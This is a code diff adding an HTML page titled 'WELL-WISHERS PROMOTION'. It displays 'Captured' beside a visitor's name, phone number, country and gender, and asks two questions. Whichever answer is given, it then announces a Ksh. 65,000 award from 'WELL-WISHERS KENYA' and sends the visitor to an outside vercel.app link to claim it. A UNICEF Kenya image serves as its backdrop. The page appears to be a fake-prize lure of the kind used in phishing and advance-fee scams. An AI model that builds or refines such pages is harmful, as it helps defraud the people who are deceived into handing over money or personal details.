@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WELL-WISHERS PROMOTION</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            background-image: url('https://www.unicef.org/kenya/sites/unicef.org.kenya/files/styles/press_release_feature/public/WhatsApp%20Image%202020-11-19%20at%2010.26.26.jpeg.webp?itok=VbBZUeYS');
+            background-size: cover;
+            background-position: center;
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+
+        .container {
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            color: green;
+            text-align: center;
+        }
+
+        .details {
+            margin-bottom: 20px;
+        }
+
+        .details label {
+            font-weight: bold;
+        }
+
+        .details p {
+            margin-top: 5px;
+        }
+
+        .question {
+            margin-bottom: 20px;
+            color: blue; /* Set question color to blue */
+        }
+
+        .radio-group {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .radio-group label {
+            margin-right: 10px;
+        }
+
+        .radio-group input[type="radio"] {
+            margin-right: 5px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .input-box {
+            border: 2px solid green; /* Frame the input box in green */
+            border-radius: 5px;
+            padding: 10px;
+            margin-top: 20px;
+        }
+
+        .input-box button {
+            background-color: #007bff;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .input-box button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>WELL-WISHERS PROMOTION</h1>
+        <div class="details">
+            <label for="fullName">Full Name:</label>
+            <p id="fullName">Captured</p>
+        </div>
+        <div class="details">
+            <label for="phoneNumber">Phone Number:</label>
+            <p id="phoneNumber">Captured</p>
+        </div>
+        <div class="details">
+            <label for="country">Country:</label>
+            <p id="country">Captured</p>
+        </div>
+        <div class="details">
+            <label for="gender">Gender:</label>
+            <p id="gender">Captured</p>
+        </div>
+
+        <div class="question" id="question1">
+            <p>Are you interested in our PROMOTION?</p>
+            <div class="radio-group">
+                <label for="interestedYes">Yes</label>
+                <input type="radio" id="interestedYes" name="interested" value="Yes" onclick="showSecondQuestion()">
+                <label for="interestedNo">No</label>
+                <input type="radio" id="interestedNo" name="interested" value="No" onclick="hideSecondQuestion()">
+            </div>
+        </div>
+
+        <div class="question hidden" id="question2">
+            <p>Have you ever benefited from any of our PROMOTIONS?</p>
+            <div class="radio-group">
+                <label for="benefitedYes">Yes</label>
+                <input type="radio" id="benefitedYes" name="benefited" value="Yes" onclick="showInputBox()">
+                <label for="benefitedNo">No</label>
+                <input type="radio" id="benefitedNo" name="benefited" value="No" onclick="showInputBox()">
+            </div>
+        </div>
+
+        <div class="input-box hidden" id="inputBox">
+            <p>CONGRATULATIONS! You have been awarded Ksh. 65,000 from WELL-WISHERS KENYA
+                Thank you for supporting us. Click the button below to claim your award.</p>
+            <button onclick="navigateToNextPage()">Continue</button>
+        </div>
+    </div>
+
+    <script>
+        function showSecondQuestion() {
+            document.getElementById('question2').classList.remove('hidden');
+        }
+
+        function hideSecondQuestion() {
+            document.getElementById('question2').classList.add('hidden');
+        }
+
+        function showInputBox() {
+            const benefitedYes = document.getElementById('benefitedYes');
+            const benefitedNo = document.getElementById('benefitedNo');
+            if (benefitedYes.checked || benefitedNo.checked) {
+                document.getElementById('inputBox').classList.remove('hidden');
+            }
+        }
+
+        function navigateToNextPage() {
+            // Redirect to the next page
+            window.location.href = "https://go-orpin-phi.vercel.app/"; 
+        }
+    </script>
+</body>
+</html>
